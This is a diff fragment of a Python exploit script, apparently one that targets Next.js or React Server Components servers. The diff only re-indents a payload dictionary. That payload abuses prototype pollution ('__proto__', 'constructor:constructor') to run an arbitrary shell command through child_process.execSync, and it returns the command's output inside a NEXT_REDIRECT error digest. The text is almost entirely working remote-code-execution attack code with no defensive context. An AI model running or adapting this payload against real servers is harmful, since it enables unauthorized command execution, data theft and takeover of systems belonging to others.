@@ -11,18 +11,18 @@ def exploit(url:str, command:str):
     }
     # payload injection
     payload = {
-  "then": "$1:__proto__:then",
-  "status": "resolved_model",
-  "reason": -1,
-  "value": "{\"then\":\"$B1337\"}",
-  "_response": {
-    "_prefix": f"var res=process.mainModule.require('child_process').execSync('{command}',{{'timeout':5000}}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
-    "_chunks": "$B1",
-    "_formData": {
-      "get": "$1:constructor:constructor"
+        "then": "$1:__proto__:then",
+        "status": "resolved_model",
+        "reason": -1,
+        "value": "{\"then\":\"$B1337\"}",
+        "_response": {
+            "_prefix": f"var res=process.mainModule.require('child_process').execSync('{command}',{{'timeout':5000}}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
+            "_chunks": "$B1",
+            "_formData": {
+            "get": "$1:constructor:constructor"
+            }
+        }
     }
-  }
-}
 
     files = {
     "0": (None, json.dumps(payload)),
